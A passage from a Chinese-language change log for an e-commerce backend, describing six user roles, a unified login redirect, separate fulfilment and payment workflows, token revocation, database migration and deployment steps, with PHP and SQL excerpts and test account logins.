# 角色權限與後台系統 — 改動說明

> 本文件記錄從「單一 admin 角色」演進到「六角色 + 訂單履約流程」的完整改動。
> 累積六輪，摘要見 [第 11 節：變更歷程](#11-變更歷程)。
>
> **目前狀態**：六種角色、統一登入入口、訂單履約與付款狀態分流、
> 財務／倉管／物流三支營運後台、權杖撤銷、帳號停用。

---

## 目錄

1. [檔案總覽](#1-檔案總覽)
2. [六種角色](#2-六種角色)
3. [資料庫變更](#3-資料庫變更)
4. [部署步驟](#4-部署步驟)
5. [後台頁面](#5-後台頁面)
6. [客服聊天室的新模型](#6-客服聊天室的新模型)
7. [訂單與支付流水的分頁](#7-訂單與支付流水的分頁)
8. [API 端點與權限總表](#8-api-端點與權限總表)
9. [權杖撤銷（Revoked_Tokens）](#9-權杖撤銷revoked_tokens)
10. [安全模型與已知限制](#10-安全模型與已知限制)
11. [變更歷程](#11-變更歷程)

---

## 1. 檔案總覽

| 檔案 | 狀態 | 說明 |
| --- | --- | --- |
| [login.html](login.html) | 🆕 | **統一登入入口** —— 登入後依角色自動導向 |
| [finance.html](finance.html) | 🆕 | 訂單帳款管理（財務） |
| [warehouse.html](warehouse.html) | 🆕 | 倉庫管理（倉管） |
| [logistics.html](logistics.html) | 🆕 | 物流管理（物流） |
| [ops.js](ops.js) | 🆕 | 上面三支頁面共用的工作佇列邏輯 |
| [MariaDB.sql](MariaDB.sql) | 改寫 | 全新安裝用結構（11 張表） |
| [MariaDB-migration.sql](MariaDB-migration.sql) | 🆕 | 既有資料庫升級腳本，**冪等**、不刪資料 |
| [MariaDB-seed-accounts.sql](MariaDB-seed-accounts.sql) | 🆕 | 重設／建立六個測試帳號的密碼（**會覆寫**，故與 migration 分開） |
| [api.php](api.php) | 改寫 | 角色權限、後台端點、聊天室成員驗證 |
| [App.js](App.js) | 修改 | 客服專屬房間、登出撤銷權杖、庫存顯示、支付方式選擇、履約狀態標籤、金額千分位；🆕 同一份程式碼另出 iOS 版 |
| [admin.html](admin.html) | 改寫 | 登入閘門（限 admin）＋ 五大功能 |
| [manager.html](manager.html) | 🆕 | 登入閘門（限 manager）＋ 五大功能 |
| [backoffice.css](backoffice.css) | 🆕 | **五支**後台頁面共用樣式 |
| [backoffice.js](backoffice.js) | 🆕 | admin / manager 共用邏輯（含金額千分位 `money()`） |
| [index.html](index.html) | 改寫 | 顧客前台補上登入與權杖、金額千分位 |

> **為什麼後台頁面要共用 CSS / JS？**
> 五支後台頁面分成兩組，各組內部畫面與功能相同，差別只在「允許進入的角色」：
>
> | 共用檔 | 服務頁面 | 差異開關 |
> | --- | --- | --- |
> | `backoffice.js` | admin.html、manager.html | `window.BACKOFFICE_ROLE` |
> | `ops.js` | finance.html、warehouse.html、logistics.html | `window.OPS_MODE` |
>
> 把邏輯抄成 2 份或 3 份的話，日後改一個 bug 就要記得改好幾個地方。
> `ops.js` 更把三種角色的差異（篩選條件、動作、按鈕文字、確認訊息）全部集中在一個 `MODES` 物件。

> ⚠️ **index.html 不在需求清單內，但它原本已經失效** ——
> 舊版寫死 `mockCustomerId = 101` 且不帶權杖，在 API 加上認證後每支請求都會被 401 擋下。
> 那是我上一輪的改動造成的，所以一併修好。

---

## 2. 六種角色

所有使用者一律從 [login.html](login.html) 進入，登入後由**後端**決定導向哪一頁
（`home_page_for_role()`，見 [第 5 節](#5-後台頁面)）。

| 角色 | 用途 | 導向頁面 |
| --- | --- | --- |
| `customer` | 逛商品、購物車、下單、看自己的訂單、找客服 | [index.html](index.html)、手機 App |
| `manager` | 管理商品／分類、訂單總覽、回覆客服聊天室 | [manager.html](manager.html) |
| `finance` 🆕 | **訂單帳款管理** —— 審核入帳，付款 `pending` → `success` | [finance.html](finance.html) |
| `warehouse` 🆕 | **倉庫管理** —— 出貨，訂單 `待出貨` → `已出貨` | [warehouse.html](warehouse.html) |
| `logistics` 🆕 | **物流管理** —— 回報送達，訂單 `已出貨` → `已完成` | [logistics.html](logistics.html) |
| `admin` | manager 全部權限，另可檢視**所有**聊天室、調整角色、停用帳號 | [admin.html](admin.html) |

> 三個營運角色是**單一職責**的：財務碰不到出貨、倉管碰不到帳款、物流不能跳過倉管。
> 權限規則見 [第 7 節](#7-訂單與支付流水的分頁)。

### 測試帳號

| 信箱 | 密碼 | 角色 |
| --- | --- | --- |
| `admin@shop.com` | `admin123` | admin |
| `manager@shop.com` | `manager123` | manager |
| `finance@shop.com` 🆕 | `finance123` | finance |
| `warehouse@shop.com` 🆕 | `warehouse123` | warehouse |
| `logistics@shop.com` 🆕 | `logistics123` | logistics |
| `customer@shop.com` | `customer123` | customer |

> ⚠️ 舊版 `MariaDB.sql` 種的密碼雜湊 `$2y$10$eImiTxHXb/...` **對不上任何密碼** ——
> `admin@shop.com` 從一開始就登不進去。

**哪支腳本會建立這些帳號：**

| 情境 | 腳本 | 效果 |
| --- | --- | --- |
| 全新安裝 | [MariaDB.sql](MariaDB.sql) | 六個帳號全部用可登入的雜湊建立 |
| 既有資料庫升級 | [MariaDB-migration.sql](MariaDB-migration.sql) | 新增 `manager` / `finance` / `warehouse` / `logistics` 四個帳號；**不動**既有帳號的密碼 |
| 修好既有帳號 | [MariaDB-seed-accounts.sql](MariaDB-seed-accounts.sql) | 重設 admin / manager / customer 的密碼（有就改、沒有就建） |

> migration 刻意不去改任何人的密碼 —— 結構升級腳本偷偷重設管理員密碼是很糟的行為。
> 所以「修帳號」獨立成 [MariaDB-seed-accounts.sql](MariaDB-seed-accounts.sql)，明確標示它會覆寫密碼。

想自訂密碼：

```bash
php -r "echo password_hash('你的密碼', PASSWORD_BCRYPT);"
# UPDATE Users SET password_hash = '產生出來的字串' WHERE email = '...';
```

⚠️ 不要用 MySQL 的 `SHA2()` / `MD5()` —— `api.php` 是用 PHP 的 `password_verify()` 比對 bcrypt，
格式不同會永遠對不上。

### 角色從哪裡讀

`require_auth()` 每次請求都**從資料庫重讀** `Users.role`，而不是把角色寫進權杖：

```php
$stmt = $pdo->prepare("SELECT user_id, full_name, email, role, status FROM Users WHERE user_id = ?");
...
if (($user['status'] ?? 'active') !== 'active') {
    deny(403, "此帳號已被停用，請聯繫系統管理員", "ACCOUNT_SUSPENDED");
}
```

> 角色與啟用狀態寫進權杖的話，把某人降級或停用後要等他手上那張過期（最多 7 天）才會生效。
> 多一次查詢換取「**降級與停權立即生效**」，這個交換划算。
>
> 回應多帶一個機器可讀的 `code: "ACCOUNT_SUSPENDED"`：停用回的是 403（不是 401），
> 而 403 也可能是「權限不足」等其他原因。前端比對 `code` 而不是中文訊息 ——
> 訊息改個字前端就不會壞。

---

## 3. 資料庫變更

### 3-1. 結構變更

| 資料表 | 變更 |
| --- | --- |
| `Users.role` | `ENUM('customer','admin')` → `ENUM('customer','manager','finance','warehouse','logistics','admin')` |
| `Users.status` | 🆕 `ENUM('active','suspended') DEFAULT 'active'` —— 帳號停用 / 重啟 |
| `Users.auth_token` / `token_expired_at` | **移除** —— 改用 HMAC 無狀態權杖，不需要存在資料表 |
| `Orders.status` | 加入 `cancelled`，再加入 `awaiting_shipment`；**語意改為純履約進度**（不再表示付款）。`pending` / `paid` 保留在 ENUM 內僅供歷史資料 |
| `Payments.status` | 預設改為 `'pending'`；值域 `success` / `pending` / `cancelled` |
| `Payments.paid_at` | 改為 `NULL DEFAULT NULL` —— 未入帳的付款不該有付款時間 |
| `Payments` 唯一鍵 | `UNIQUE (order_id)` —— 一張訂單只該有一筆付款紀錄 |
| `Chat_Rooms.admin_id` | 改名為 `manager_id` —— 客服對話是「customer ↔ manager」 |
| `Cart` 唯一鍵 | `UNIQUE (user_id, product_id)` —— 加入購物車的邏輯本來就是「找到就累加」 |
| `Revoked_Tokens` | 🆕 權杖黑名單（見 [第 9 節](#9-權杖撤銷revoked_tokens)） |

### 3-2. 資料遷移（migration 會自動處理）

| 動作 | 說明 |
| --- | --- |
| 舊訂單狀態搬遷 | `pending` / `paid` → `awaiting_shipment`。這兩種都代表「還沒出貨」，付款狀況不會遺失 —— 它記在 `Payments.status` |
| 補上缺漏的付款紀錄 | 沒有付款紀錄的舊訂單（結帳到一半放棄的）補一筆 `pending`，否則財務頁看不到、倉管也不知道該不該出貨 |
| 舊付款紀錄補狀態 | 既有付款一律視為 `success`（它們是舊制即時扣款產生的） |

### 3-3. 索引

| 索引 | 用途 |
| --- | --- |
| `idx_orders_created` | 訂單流水 `ORDER BY created_at ASC` 分頁。沒有它，每翻一頁 MariaDB 都要把整張 Orders 排序一次 |
| `idx_orders_status_created` | 🆕 倉管／物流的工作佇列 —— 依狀態篩選 + 依成立時間排序 |
| `idx_payments_status` | 🆕 財務的待收款佇列 —— 依付款狀態篩選 |
| `idx_chatrooms_customer` / `idx_chatrooms_manager` | 「這位客戶的房」「還沒人認領的房」兩種掃描 |
| `idx_revoked_expires` | 清理過期黑名單 |
| `idx_messages_room` | 客服輪詢每 2 秒掃一次訊息 |

---

## 4. 部署步驟

### 4-1. 資料庫

你的 `shop_db` 已經有大量既有資料（上百筆會員／商品／訂單／聊天室），
所以要跑 **migration**，不是 MariaDB.sql —— 後者的 `CREATE TABLE` 會直接失敗。

```bash
# 先備份
C:\xampp\mysql\bin\mysqldump.exe -h 192.168.8.88 -u admin -p shop_db > shop_db_backup.sql

# 執行升級
C:\xampp\mysql\bin\mysql.exe -h 192.168.8.88 -u admin -p shop_db < MariaDB-migration.sql
```

腳本是**冪等**的：每個步驟都先查 `information_schema` 確認需不需要做，
重複執行不會報錯，第二次跑只會看到一整排「已存在，略過」。

> **目前狀態**：本腳本已實際套用於 `shop_db`，六個角色、`awaiting_shipment`、
> `Revoked_Tokens`、`Payments` 唯一鍵等全部到位，舊訂單也已完成搬遷。
> 首次驗證是在暫存資料庫 `shop_db_mig_test`（用實際結構複製）上進行，驗證後已刪除。
>
> 由於腳本冪等，日後重跑只會看到一整排「已存在，略過」，不會重複搬資料。

### 4-2. 上傳檔案到伺服器

`api.php` 與七支網頁要放在同一個目錄（例如 `192.168.8.88` 的網站根目錄）：

```
api.php
db.ini
login.html          ← 統一登入入口（使用者從這裡進來）
index.html          ← 顧客前台
admin.html          ← 系統管理員後台
manager.html        ← 營運人員後台
finance.html        ← 訂單帳款管理（財務）
warehouse.html      ← 倉庫管理（倉管）
logistics.html      ← 物流管理（物流）
backoffice.css      ← 全部後台頁面共用樣式
backoffice.js       ← admin / manager 共用邏輯
ops.js              ← finance / warehouse / logistics 共用邏輯
```

使用者只需要知道 `login.html` 這一個網址，登入後系統會自動送他到對的地方。

> 網頁的 API 位址預設是**相對路徑** `api.php`（與本頁同目錄），
> 這樣可以完全避開 CORS。若後台與 API 不同主機，在登入頁的「連線設定」填完整網址即可。

#### ⚠️ 上傳後務必核對檔案大小

`backoffice.js` 與 `backoffice.css` 名字很像，很容易在上傳時把同一個檔案傳兩次
（實際發生過：伺服器上的 `backoffice.js` 內容是 CSS）。
症狀是**登入按鈕按了完全沒反應**，畫面上看不出任何原因。

```bash
# 逐一比對大小，兩邊要一致
curl -s -o /dev/null -w "backoffice.js  %{size_download}\n" http://192.168.8.88/backoffice.js   # ~33 KB
curl -s -o /dev/null -w "backoffice.css %{size_download}\n" http://192.168.8.88/backoffice.css  # ~8 KB
curl -s -o /dev/null -w "ops.js         %{size_download}\n" http://192.168.8.88/ops.js          # ~16 KB
```

最直接的做法是用瀏覽器打開 `http://<你的IP>/backoffice.js`，
第一行應該是 `/* 後台共用邏輯 ...`，如果看到 `後台共用樣式` 就是傳錯了。

五支後台頁面都加上**自我檢查**：對應的 JS 沒正確載入時，畫面會直接顯示
「⚠️ backoffice.js / ops.js 沒有正確載入」並列出排查步驟，
不會再讓你對著沒反應的按鈕或卡住的「正在確認登入狀態」猜原因。

另外，五支後台頁面的 `<head>` 都內嵌了一份關鍵可見性規則：

```css
#app { display: none; }
#app.ready { display: block; }
```

這是刻意不依賴外部 CSS 的 —— `backoffice.css` 若沒載入成功，
`.app { display:none }` 就不會生效，**整個後台畫面會在未登入狀態下直接顯示出來**。
內嵌用 `#id` 選擇器（優先權高於 class）當保險。

> 這條規則是實際踩過坑之後補的：曾經發生 `backoffice.js` 被誤傳成 CSS 內容，
> 當時若 CSS 也一併傳錯，後台就會整頁裸奔。

### 4-3. db.ini

你的 `db.ini` 已經設好 `token_secret` ✅

⚠️ 順帶修掉一個隱藏地雷：`db.ini` 用的鍵名是 `user` / `dbname`，
但 `api.php` 讀的是 `username` / `db_name` —— 目前只是**碰巧**因為
預設值 `admin` / `shop_db` 剛好等於你的設定值才連得上。
一旦你改動 `db.ini` 裡的 `user` 或 `dbname`，改動不會生效卻不會報錯。
現在兩種鍵名都吃：

```php
$db_name  = $config['db_name']  ?? $config['dbname'] ?? 'shop_db';
$username = $config['username'] ?? $config['user']   ?? 'root';
```

---

## 5. 後台頁面

後台共五支，分成兩組。

### 5-1. 綜合後台（admin / manager）

功能相同，差別只在角色與少數權限：

| 功能 | admin.html | manager.html |
| --- | --- | --- |
| 📦 商品管理 | ✅ 新增 / 編輯 / 刪除 / 分頁清單 | ✅ 同左 |
| 🏷️ 分類管理 | ✅ 新增 / 編輯 / 刪除 | ✅ 同左 |
| 📜 訂單與支付流水 | ✅ 分頁 + 改狀態 + 展開明細 | ✅ 同左 |
| 👥 會員帳戶清單 | ✅ 可調整角色、**停用 / 重啟帳號** | 唯讀（後端擋 403） |
| 💬 客服即時通訊中心 | 看得到**所有**聊天室 | 只看「未認領 + 自己認領」 |

### 5-2. 營運後台（finance / warehouse / logistics）

三支頁面骨架相同 —— 一張「我該處理的訂單」工作佇列 + 一個動作按鈕。
差異全部集中在 `ops.js` 的 `MODES` 設定物件：

| 頁面 | 角色 | 佇列內容（`scope`） | 動作 | 效果 |
| --- | --- | --- | --- | --- |
| [finance.html](finance.html) | finance | 付款 `pending` 的訂單 | **確認收款** | `Payments.status` → `success`，記錄收款時間 |
| [warehouse.html](warehouse.html) | warehouse | 訂單 `awaiting_shipment` | **出貨** | `Orders.status` → `shipped` |
| [logistics.html](logistics.html) | logistics | 訂單 `shipped` | **回報送達** | `Orders.status` → `completed` |

處理完的訂單會自動離開本佇列、進入下一關，所以佇列本身就是待辦清單。

**貼心設計**：

* 倉管頁把**未收款**訂單標紅，並在確認框提醒 ——
  貨到付款屬正常情形，但若是 ATM 轉帳應先與財務確認。
* 物流頁對**貨到付款**訂單提醒向客戶收現，並通知財務登錄。
* 三支頁面都可展開訂單完整明細（主檔 + 商品 + 付款）。

### 統一登入與角色導向 🆕

登入功能已從三支網頁抽離到 [login.html](login.html)。原本每一頁都帶一份登入表單與驗證邏輯，
同樣的程式碼維護三份，而且各自判斷「這個角色能不能進來」。

```
login.html ──登入──► 後端回傳 role 與 home
                        ├─ customer  → index.html
                        ├─ manager   → manager.html
                        ├─ finance   → finance.html
                        ├─ warehouse → warehouse.html
                        ├─ logistics → logistics.html
                        └─ admin     → admin.html
```

**導向哪一頁是後端決定的**（需求 2 的「經過 Server 端處理」）：

```php
function home_page_for_role($role) {
    switch ($role) {
        case 'admin':     return 'admin.html';     // 系統管理員後台
        case 'manager':   return 'manager.html';   // 營運人員後台
        case 'finance':   return 'finance.html';   // 訂單帳款管理
        case 'warehouse': return 'warehouse.html'; // 倉庫管理
        case 'logistics': return 'logistics.html'; // 物流管理
        default:          return 'index.html';     // customer 一般消費者前台
    }
}
```

登入回應與 `GET /users` 都會帶這個 `home` 欄位。前端只負責照做 ——
日後新增角色或改檔名，只要動 `api.php` 這一個函式，不必去改每一支網頁。

> ⚠️ **但 `login.html` 底部的「角色說明」是寫死的提示文字**，新增角色時要一起改。
> 第 7 輪加了三個營運角色後這裡曾漏改，畫面只列出 3 種；而且 `.tag.finance` 等徽章
> 沒有 CSS，就算補上文字也會變成白底白字。第 8 輪已補齊六種角色與配色：
>
> | 角色 | 徽章色 |
> | --- | --- |
> | customer | `#7f8c8d` |
> | manager | `#16a085` |
> | finance | `#d35400` |
> | warehouse | `#8e44ad` |
> | logistics | `#2980b9` |
> | admin | `#e67e22` |

#### 三支頁面現在只負責守門

| 情況 | 行為 |
| --- | --- |
| 沒有權杖 | 導向 `login.html` |
| 角色不符本頁 | 導向後端指定的 `me.home`（不是丟一句錯誤讓人卡住） |
| 權杖過期 | 導向 `login.html?reason=expired` |
| 帳號被停用 | 導向 `login.html?reason=suspended` |
| 主動登出 | 撤銷權杖後導向 `login.html?reason=logout` |

畫面預設 `display:none`，確認身分後才顯示。

> **權杖鍵名已統一為 `shop_token`。**
> 先前 index.html 用 `shop_customer_token`、後台用 `shop_token`，
> 單一登入頁必須寫進同一個鍵，三支頁面才讀得到。
> 副作用是同一個瀏覽器同時只會有一個登入身分 —— 這正是單一登入該有的行為。

> **`login.html?reason=...` 為什麼要帶參數？**
> login.html 開頁時若發現已有有效權杖，會自動把你送去 `home`。
> 剛被踢出來時若沒有 `reason`，就會立刻又被送回去 —— 變成無限跳轉。
> 帶著 reason 回來時會跳過自動導向，並顯示被踢出來的原因。

> 🛡️ 前端的角色檢查只是「不要讓看不懂的畫面出現」，**不是安全機制**。
> 真正的把關在 `api.php` —— 每支 `staff-*` 端點都會用權杖驗身分與角色，
> 直接拿 curl / Postman 打 API 一樣會被 401 / 403 擋下。

### 商品管理的分類 listbox（需求 4）

原本「所屬分類 ID」是 `<input type="number">`，要自己記編號。改成下拉選單：

```html
<select id="pCatId">
  <option value="">（未分類）</option>
  <option value="1">1 - 3C電子</option>
  <option value="2">2 - 流行服飾</option>
</select>
```

選項同時列出 `category_id` 與 `category_name`，資料來自 `GET /categories`。
留空送 `null`（未分類），不是 `0` —— 外鍵沒有 `0` 這筆。

### 商品與分類拆成兩支（需求 4）

原本擠在同一個「商品與分類管理」頁籤，現在是側邊欄的兩個獨立項目：
`📦 商品管理` 與 `🏷️ 分類管理`，各自有完整的清單 + 表單 + 編輯 / 刪除。

---

## 6. 客服聊天室的新模型

### 舊版的問題

App.js 寫死 `CHAT_ROOM_ID = 1`，所有客戶擠在同一間房 ——
**每位客戶都看得到別人跟客服講了什麼**。

### 新模型（需求 3、9）

```
客戶端進入客服畫面
   ↓
POST /chat-rooms          ← 不用帶任何參數，身分來自權杖
   ↓
後端：SELECT room_id FROM Chat_Rooms WHERE customer_id = 我 AND status='open'
   ├─ 有 → 沿用（不會每次點都多開一間房）
   └─ 無 → 開新的
   ↓
回傳 room_id，之後所有訊息都綁在這個房號
```

manager 端在後台看到房間清單，回覆時 **自動認領**：

```php
// 「誰先回覆誰負責」，不必再多一個認領按鈕
if ($me['role'] === 'manager' && $room['manager_id'] === null) {
    UPDATE Chat_Rooms SET manager_id = 我 WHERE room_id = ? AND manager_id IS NULL
}
```

### 成員驗證（需求 9）

每次讀寫訊息都經過 `assert_room_member()`：

| 角色 | 看得到哪些房 |
| --- | --- |
| `customer` | 只有自己是房主的房 |
| `manager` | `manager_id IS NULL`（未認領，可接手）+ `manager_id = 自己` |
| `admin` | 全部（稽核用） |

不是成員 → **403**，房間不存在 → **404**。

> **為什麼 manager 不能看別人認領的房？**
> 避免兩位客服同時回同一位客戶。一旦有人回覆，那間房就從其他 manager 的清單消失。
> admin 保留全部檢視權是因為稽核與交接需要。

### 附帶功能

- **未讀數**：`GET /messages` 會把「別人傳給我的、還沒讀的」標記成已讀，
  聊天室清單的紅色未讀徽章才有意義
- **結案**：manager 可 `PUT /chat-rooms {action:'close'}`，客戶下次發問會自動開新房
- **客服徽章**：訊息回傳 `sender_role`，App 與網頁會在客服訊息前加上 `🎧 …（客服）`

---

## 7. 訂單與支付流水的分頁

需求 7：**每 20 筆一頁，依「成立時間」最早的排最前面**。

```sql
SELECT o.order_id, o.user_id, o.total_amount, o.status, o.created_at,
       u.full_name, u.email,
       pay.payment_method, pay.transaction_id, pay.amount AS paid_amount, pay.paid_at
  FROM Orders o
  JOIN Users u ON u.user_id = o.user_id
  LEFT JOIN (SELECT order_id, MAX(payment_id) AS payment_id
               FROM Payments GROUP BY order_id) lastpay
         ON lastpay.order_id = o.order_id
  LEFT JOIN Payments pay ON pay.payment_id = lastpay.payment_id
 ORDER BY o.created_at ASC, o.order_id ASC
 LIMIT 20 OFFSET ?
```

回應帶分頁中繼資料，前端才畫得出頁碼列：

```json
{ "page": 1, "per_page": 20, "total": 101, "total_pages": 6, "data": [ ... ] }
```

> **為什麼付款要用子查詢再 JOIN，不直接 `LEFT JOIN Payments`？**
> 一張訂單理論上只會有一筆付款（`POST /payments` 有 `pending` 檢查），
> 但資料庫裡若真有兩筆，直接 JOIN 會讓該訂單**複製成兩列** ——
> 那一頁就變成 20 列卻只有 19 張訂單，而 `total` 是用 `COUNT(*) FROM Orders` 算的，
> 分頁會整個對不上。先挑出「最後一筆付款」再 JOIN 可以保證一張訂單一列。

> `ORDER BY created_at ASC` 後面補 `order_id ASC`：`created_at` 是 TIMESTAMP，
> 同一秒內成立的訂單排序不穩定，翻頁時可能重複或漏掉。補主鍵讓排序唯一。

### 訂單履約流程與角色分工 🆕

**訂單狀態不再表示付款。** 這是這一版最重要的語意轉變：

| | 記錄什麼 | 由誰推進 |
| --- | --- | --- |
| `Orders.status` | **履約進度**（貨到哪了） | 倉管 → 物流 |
| `Payments.status` | **付款狀態**（錢收到沒） | 財務 |

兩條流程獨立並行，互不干涉：

```
客戶結帳
   │
   ├─ Orders.status   = awaiting_shipment 待出貨   ← 一律如此，不管錢收到沒有
   └─ Payments.status = success（信用卡等即時扣款）
                      或 pending（ATM 轉帳 / 貨到付款）
   │
   ├─【財務】finance.html   pending → success        （查到入帳 / 收到現金）
   ├─【倉管】warehouse.html awaiting_shipment → shipped   （交給物流公司）
   └─【物流】logistics.html shipped → completed          （客戶簽收）
```

> **為什麼要拆開？**
> 舊制用 `paid` 同時表示「收到錢」與「可以出貨」，但貨到付款是「先出貨才收錢」——
> 用同一個欄位表達就會打結。拆開之後，倉管看得到「這張還沒收款」但仍可依政策出貨。

#### 六種角色

| 角色 | 入口 | 職責 |
| --- | --- | --- |
| `customer` | index.html | 購物、下單、看自己的訂單 |
| `manager` | manager.html | 商品/分類、客服、訂單總覽（可走任何一步） |
| `finance` 🆕 | finance.html | **訂單帳款管理** —— 只能改付款狀態 |
| `warehouse` 🆕 | warehouse.html | **倉庫管理** —— 只能 待出貨 → 已出貨 |
| `logistics` 🆕 | logistics.html | **物流管理** —— 只能 已出貨 → 已完成 |
| `admin` | admin.html | 全部，另可調整會員角色與停用帳號 |

#### 權限中樞

誰能做哪一步集中在 `api.php` 的 `order_transition_rules()`，**同時檢查「改成什麼」與「原本是什麼」**：

```php
case 'warehouse': return ['shipped'   => ['awaiting_shipment']];
case 'logistics': return ['completed' => ['shipped']];
```

只檢查目標狀態是不夠的 —— 物流可以把還沒出貨的訂單直接標成已完成，跳過倉管那一關。
實測結果：

```
物流想直接標完成 → 訂單目前是「awaiting_shipment」，不能直接改為「completed」
倉管想確認收款   → 權限不足，此功能限「finance / manager / admin」使用
財務想出貨       → 你的角色不能把訂單改為「shipped」
```

#### 收款獨立成 `staff-payments`

「確認收款」從 `staff-orders` 拆出來 —— 訂單狀態改成純履約進度之後，
收款不再是「把訂單改成已付款」，而是「把付款紀錄從 pending 改成 success」。
兩者是不同的事，權限也不同（財務管帳款、倉管管出貨），混在同一支端點會分不開。

### 支付方式與狀態流程分流 🆕

支付方式分成兩類，訂單與付款的狀態流程跟著分流：

| 支付方式 | 型態 | 結帳當下 | 訂單狀態 | 付款狀態 | `paid_at` |
| --- | --- | --- | --- | --- | --- |
| 信用卡 / 行動支付 / App 支付 | `instant` | 線上授權即扣款 | `paid` | `success` | 有 |
| ATM 轉帳 | `deferred` | 尚未收到錢 | `pending` | `pending` | `NULL` |
| 貨到付款 | `deferred` | 送達才收現 | `pending` | `pending` | `NULL` |

對照表放在 `api.php` 的 `PAYMENT_METHODS`：

```php
const PAYMENT_METHODS = [
    'Credit Card'  => 'instant',
    'Mobile Pay'   => 'instant',
    'App Pay'      => 'instant',
    'ATM Transfer' => 'deferred',
    'COD'          => 'deferred',
];
```

#### 後台「確認收款」

待收款的訂單在訂單流水的「付款狀態」欄會顯示橘色 `待收款` 標籤 + 一顆**確認收款**按鈕。
按下去就是把訂單狀態改為 `paid`，後端在**同一個事務**內連動更新付款紀錄：

```php
if ($status === 'paid') {
    // ATM 轉帳查到入帳、貨到付款收到現金
    UPDATE Payments SET status = 'success', paid_at = NOW()
      WHERE order_id = ? AND status = 'pending'
} elseif ($status === 'cancelled') {
    // 還沒入帳就取消 → 那筆付款不會發生了
    UPDATE Payments SET status = 'cancelled' WHERE order_id = ? AND status = 'pending'
}
```

> **為什麼要連動？**
> 不連動的話會出現「訂單顯示已付款、付款紀錄卻還停在待入帳」這種自相矛盾的資料。
> 做在同一個事務裡，兩者不可能只成功一半。

#### 重複送出的防護

延後付款的訂單**會停在 `pending`**，所以 `POST /payments` 原本那道
「訂單必須是 pending」的檢查擋不住重複送出 —— 使用者按兩次就會產生兩筆付款紀錄。
因此改用「這張訂單是否已經有付款紀錄」判斷，並在資料庫層加上 `UNIQUE (order_id)` 當最後一道防線。

### 取消訂單會還原庫存

```php
if ($status === 'cancelled') {
    // 把當初扣掉的庫存加回去，否則商品會憑空消失
    UPDATE Products SET stock_quantity = stock_quantity + ? WHERE product_id = ?
}
```

整段包在事務裡，且已取消的訂單不能再改狀態（回 409）。

---

## 8. API 端點與權限總表

| 端點 | 方法 | 權限 | 說明 |
| --- | --- | --- | --- |
| `/users?action=login` | POST | 公開 | 回傳 `token` + `role` + 🆕 `home`（導向頁面） |
| `/users?action=logout` | POST | 🔒 登入 | 🆕 把權杖寫進黑名單 |
| `/users` | POST | 公開 | 註冊（role 一律寫死 `customer`） |
| `/users` | GET | 🔒 登入 | 只能讀**自己**的資料；含 🆕 `home` 供各頁守門用 |
| `/categories` | GET | 公開 | 分類列 + 後台 listbox 來源 |
| `/products` | GET | 公開 | 前台商品目錄（每頁 20 筆） |
| `/cart` | GET/POST/PUT/DELETE | 🔒 登入 | 身分來自權杖 |
| `/orders` | POST | 🔒 登入 | 結帳；金額由後端算 |
| `/orders` | GET | 🔒 登入 | 不帶參數 → 自己的訂單列表 |
| 🆕 `/orders?order_id=X` | GET | 🔒 登入 | 單一訂單**完整資訊**：主檔 + 明細 + 付款紀錄；客戶限自己的，**五種後台角色**（`BACKOFFICE_ROLES`）可看任一張 |
| `/order-items` | GET | 🔒 登入 | 客戶限自己的；五種後台角色可看任一張 |
| `/payments` | POST | 🔒 登入 | 金額讀 `Orders.total_amount`；🆕 `payment_method` 白名單 + 狀態分流 |
| `/reviews` | GET | 公開 | 評價是公開資訊 |
| `/reviews` | POST | 🔒 登入 | 作者來自權杖 |
| `/chat-rooms` | POST | 🔒 customer | 取得或建立自己的房 |
| `/chat-rooms` | GET | 🔒 登入 | 依角色過濾（見第 6 節） |
| `/chat-rooms` | PUT | 🔒 manager+admin | 認領 / 結案（刻意不含三個營運角色 —— 客服不是他們的職責） |
| `/messages` | GET/POST | 🔒 成員 | 每次都驗成員資格 |
| 🆕 `/staff-categories` | GET/POST/PUT/DELETE | 🔒 manager+admin | 分類管理 |
| 🆕 `/staff-products` | GET/POST/PUT/DELETE | 🔒 manager+admin | 商品管理（分頁） |
| 🆕 `/staff-orders?scope=` | GET | 🔒 五種後台角色 | 訂單流水（分頁，最早在前）。`scope` 可為 `finance` / `warehouse` / `logistics`，省略則列全部 |
| 🆕 `/staff-orders` | PUT | 🔒 **依角色** | 履約狀態轉換，可做哪一步見 `order_transition_rules()` |
| 🆕 `/staff-payments` | PUT | 🔒 finance / manager / admin | 確認收款：付款紀錄 `pending` → `success` |
| 🆕 `/staff-users` | GET | 🔒 manager+admin | 會員清單（分頁） |
| 🆕 `/staff-users` | PUT | 🔒 **admin only** | 調整會員角色（六種）、停用 / 重啟帳號 |

### 命名規則

| 前綴 | 意義 |
| --- | --- |
| 無前綴（`/products`…） | 前台 —— 公開或客戶自用 |
| `staff-` | 後台 —— 至少需要後台角色，**個別端點的角色要求不同** |

`staff-` 不等於「manager / admin 專屬」。實際分三層：

| 層級 | 端點 | 允許角色 |
| --- | --- | --- |
| 總管功能 | `staff-products`、`staff-categories`、`staff-users` GET | manager、admin |
| 訂單作業 | `staff-orders` GET / PUT、`/orders?order_id=` GET、`/order-items` GET | manager、admin、finance、warehouse、logistics（PUT 再依 `order_transition_rules()` 分流） |
| 帳款 | `staff-payments` PUT | finance、manager、admin |
| 最高權限 | `staff-users` PUT | **admin only** |

### 後台角色清單只定義一次：`BACKOFFICE_ROLES` 🆕

```php
const BACKOFFICE_ROLES = ['manager', 'admin', 'finance', 'warehouse', 'logistics'];

function is_backoffice($role) {
    return in_array($role, BACKOFFICE_ROLES, true);
}
```

`require_backoffice()`（端點層）與 `GET /orders?order_id=`、`GET /order-items`（資料列層「這張訂單你能不能看」）
都讀這同一個常數。

**為什麼要特別抽出來**：第 7 輪新增三個營運角色時，這份清單在程式裡寫了**三次**，只改到端點層那一次。
結果財務點「明細」一律顯示「找不到資料」—— 端點層放行（所以回 404 不是 403），
進到端點內部判斷擁有者時，`['manager', 'admin']` 不認得 finance，就掉進「只能看自己的訂單」分支。

使用者回報的是「ATM 轉帳的訂單才會壞」，但支付方式其實無關：
財務佇列只收待收款訂單，而待收款的剛好都是 ATM 轉帳與貨到付款。

> `chat-rooms` 的 PUT 仍刻意寫死 `['manager', 'admin']`，不走 `BACKOFFICE_ROLES`。

### 為什麼 `/products` 與 `/staff-products` 分開

前台的 `/products` 是唯讀、公開、回傳純陣列（App 靠「少於 20 筆」判斷沒有下一頁）。
後台需要庫存、分類名稱、分頁中繼資料，還要能寫入。
硬塞進同一個端點會讓 GET 的回應形狀依角色而變，前端得寫兩套解析。

### 調整角色為什麼只有 admin 能做

